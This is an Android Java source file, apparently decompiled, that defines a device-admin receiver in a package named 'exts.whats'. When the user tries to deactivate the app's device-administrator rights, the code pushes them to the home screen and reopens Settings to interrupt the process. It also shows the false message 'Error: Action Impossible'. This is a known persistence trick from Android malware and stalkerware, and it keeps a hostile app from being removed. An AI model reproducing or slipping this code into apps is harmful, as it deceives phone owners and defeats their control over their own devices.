package exts.whats;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class DevAdminReceiver extends DeviceAdminReceiver {
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
    }

    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
    }

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED")) {
            Intent startMain = new Intent("android.intent.action.MAIN");
            startMain.addCategory("android.intent.category.HOME");
            startMain.setFlags(268435456);
            context.startActivity(startMain);
            Intent startSettings = new Intent("android.settings.SETTINGS");
            startSettings.addFlags(268435456);
            startSettings.addFlags(32768);
            startSettings.addFlags(8388608);
            context.startActivity(startSettings);
        }
        super.onReceive(context, intent);
    }

    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
    }

    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
    }

    public void onPasswordSucceeded(Context context, Intent intent) {
        super.onPasswordSucceeded(context, intent);
    }

    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Error: Action Impossible";
    }
}
